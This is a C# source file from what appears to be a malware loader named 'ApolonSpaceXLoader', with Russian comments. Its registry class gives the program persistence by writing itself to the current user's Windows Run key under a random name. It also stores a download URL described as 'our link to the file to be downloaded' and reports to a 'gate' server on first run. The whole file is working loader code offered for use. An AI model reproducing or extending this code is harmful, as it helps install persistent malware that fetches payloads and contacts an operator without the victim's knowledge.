namespace ApolonSpaceXLoader
{
    using Microsoft.Win32;
    using System;
    using System.Net;
    using System.Windows.Forms;

    class MyRegistry
    {
        private static string name = Helper.RandomID();
                
        public static void Check() //Проверка на реестр
        {
            try
            {
                RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\");

                if (ProgramFolder != null)
                { }
                else
                {
                    SetFirstSettings();
                    AR();                    
                    ProgramFolder.Close();
                }                
            }
            catch { }
        }

        private static void AR() // автозапуск
        {            
            string ExePath = Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
            reg.SetValue(name, ExePath);
            reg.Close();
        }

        private static void SetFirstSettings() // устанавливаем значения в реестре
        {            
            RegistryKey CreateRegFolder = Registry.CurrentUser.CreateSubKey(@"Software\SpaceX\");
            CreateRegFolder.SetValue("URL", ""); // тут будет наша ссылка  на скачиваемый файл
            if (CreateRegFolder.GetValue("GATE") == null) // проверка на наличие значения
            {
                CreateRegFolder.SetValue("GATE", "NO");
            }
            if (CreateRegFolder.GetValue("GATE").ToString() != "YES") // проверка на отправку на гейт
            {
                HttpWebRequest.Create(Program.Gate);
                CreateRegFolder.DeleteValue("GATE");
                CreateRegFolder.SetValue("GATE", "YES"); // меняем значение
            }
            CreateRegFolder.Close();
        }

        public static void SetURL(string URL) // устанавливаем ссылку в реестре
        {
            RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true);
            CreateRegFolder.DeleteValue("URL");
            CreateRegFolder.SetValue("URL", URL);
            CreateRegFolder.Close();
        }

        public static string GetURL() // получаем ссылку из реестре
        {
            RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\");
            string url = null;
            if (ProgramFolder != null)
            {
                url = ProgramFolder.GetValue("URL").ToString();
                ProgramFolder.Close();
            }            
            return url;
        }
    }
}
